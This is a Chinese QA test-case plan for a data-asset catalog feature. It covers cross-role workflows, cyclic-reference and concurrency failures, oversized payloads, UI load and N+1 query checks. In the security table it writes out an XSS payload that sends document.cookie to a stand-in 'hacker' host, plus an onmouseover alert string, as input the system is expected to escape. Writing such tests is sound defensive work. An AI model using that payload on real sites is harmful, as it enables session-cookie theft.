# 详细测试案例文档 (Comprehensive Test Cases) - 深水地毯探索版

> 以下为 `docs/06-详细测试案例/ASSET-ALL.md`。为承接用户最高规格防脱轨要求，本册集合了地毯级的边缘极值测试和架构底线探测。任何一处图谱嵌套和搜索并发都是 QA 真实回归的核心标靶。

## 1. 跨模块全栈链路测试 (Integration & E2E)
> 此阶段主要从真实业务不同利益使用者的长臂连通协作下切入，查出各独立完美接口合并在一起后的死锁不连贯 Bug。

| 验证需求切点 | 链路剧情场景 | Given (环境/装配) | When (持续复合操作流) | Then (多点断层预期及安全交接预期) | 截图凭证要求 |
|:---|:---|:---|:---|:---|:---|
| **001/002/003大动脉联通** | **跨角色全生命周期：从无到库再到树** | 空状态，多用户端 | 1. 架构师A建了TypeX并组装10个属性；2. 架构师A建3级连环目录库长深结构; 3. 业务员B用TypeX在深层目录下建档记录D1；4. 管理员C对D1追加补充资料并移动其从子目录去往根目录。 | 各角色均能在自身权限范畴内看见正确生效的 UI 变迁。尤其管理员C改组关联后，系统能完美消除旧的 `entity_relationship` 依赖，重组新的父子从属关系不出孤儿节点。 | [复杂移动重组前后的底层图谱数据库关系变化图] |
| **004高级引擎**| **多重树域+布尔 AND/OR/NOT 大回响查询合成战** | 庞大ES池化数据底座 | 构建极端过滤式：`(Category=A AND Type!=B) OR (Catalog选择在A下无限蔓延渗透 AND Name含有"Test")`。 | ES查询器不能崩溃报错。结果列中必须不仅**不含有**非A目录及其子嗣的东西，还要能够完全排斥掉Type为B的任何间接数据，完全展现下穿全囊括性能。 | [复杂的 ES 拼接组建视图和对应空窗期结果返回比对图] |

## 2. 深水区探索与破坏性测试 (Exploratory & Destructive)
> 专门针对需求中隐性但极其致命的 OOM、死锁、异构并发与跨端渗透环节发起挑战。

| 验证需求切点 | 破坏特征 | Given | When (非常态违规或极限操作) | Then (防御机制拦截下限) | 实机截图凭证要求 |
|:---|:---|:---|:---|:---|:---|
| **001/004图谱底层** | **图谱循环死锁与环形网络轰炸** | 有目录A和目录B | 调接口强行发包：设 A 的 Parent=B，然后再发设 B 的 Parent=A。 | OM 原生 `entity_relationship` 防腐层自动识破并拦截 "Cyclic Reference / 环形嵌套"，拒绝落库，绝引发无休止的堆栈 OOM 溢出灾难。 | [Postman拦截环状闭环的400提示报态] |
| **002强力篡改防线** | **被抢占中的字典强删并发幻影** | Attribute-X 刚挂给某 Type 被录入者打开展板待存 | 超管在另一个窗口点击字典强删执行键 | 超管操作强行通过并物理抹除落定。而停留在表单填写的普通职员点击保存时，即时响应 "此属性主干定义已被剥夺抛弃不可组装" （不能暴露出丑陋的后端 500 外键丢失或 JSON 回显错位）。 | [前后脚并发抛弃后的优美报错阻断栏] |
| **003极限荷载截击** | **JSON Extension 撑爆黑洞截断测试** | 暴露的 API 网关 | 恶意向 `Text` 或 `Array` 扩展栏内疯狂发推 50 个层级深度或 50MB 超大型垃圾废弃报文 | 底层持久化或前端负载在第一线防线阻截返回 HTTP 413 Payload Too Large 或 400 系列超限拦截警告卡断。 | [过分膨胀字典的防注入 413 网关屏障报表] |
| **004大长屏抗震** | **骨架屏虚拟懒加载轰炸大考** | 左侧目录树 | 用脚本生成了 3 万个树形叶子散落分布 | 疯狂操作折叠又展开那长达数万行的分级区。 | 浏览器 UI 线程不能处于假死冻结瘫痪无回弹，滚动条下拉必须配合着平滑的分页 Chunk 拉取，或者出现防抖 Loading 等待幕。 | [加载数万叶子还能流畅调教出滚动轮截图] |

## 3. 历史大范围防退化 (Regression Focus)
> 判断本次 005 全局基建融合要求的底层泛用性继承，是否因为过度重写 BaseEntity 以及加入 Graph 图谱逻辑而祸害了原本的其他功能块。

| 考察域切点 | 考核动作 | 预期安全接棒及不崩断的绝命底线 |
|:---|:---|:---|
| **005互动继承系** | 去老词表（Glossary）、老表库模块中随便挑几条旧款组件测试其原生附属体系（点赞、差评、变更履历、活动流留言）。 | 老版面的右侧信息流要完全原样工作和触发通知。新加的 `asset` 包群任何底层钩子和拦截器改写变动，**绝对不能**污染和弄歇全局的系统通知引擎基座。 |
| **005全局泛搜索大一统** | 在页面顶部的 SearchBar 使用中英文混合对各类旧表和词语发号施令查调。 | 绝对不能因为新扩装了五个巨无霸的 `AssetCatalog` 等 Mapping 导致倒排索引冲突或映射爆粗抛异常，新旧必须各司其职井水不犯河水式和谐回显。 |

## 4. 性能安全与硬性漏洞打怪验证 (Non-Functional)
| 性能与安全核切点 | 施加非常态手段 | 预期安全防御结果机制 |
|:---|:---|:---|
| **SQL N+1 黑洞连环查询遏流** | 用同一父级 Catalog 加载 **2 万个** DataAsset 子实体，而后带上 `?fields=dataAssets` 延展查询其明细详情包。 | API 返回 RT 切忌裂变成几分钟超时，后台 SQL 的日志滚动绝对不可以像加特林一样爆鸣 `SELECT ... FROM data_asset where id=?` 发起 2 万次循环查死数据库，必须由强力 JOIN 一把拢截获。 |
| **XSS 反向跨站注毒过滤网** | 找到 `DataAsset` 能够手填的名称或者在 `extension_data` 中埋入致命 Payload: `<script>fetch('http://hacker/cookie?c='+document.cookie)</script>` 和包含 `onmouseover=alert(1)` 的大段文集。 | 所有这部分内容展现于 Detail 栏、概览右侧悬浮板乃至 ES 查询的摘要字眼时，框架**必须强制触发全部 Escape 和 Html Encode 对位硬转译**当作纯文本渲染，若是引发脚本连携弹送直接按照严重最高级阻断驳回。 |
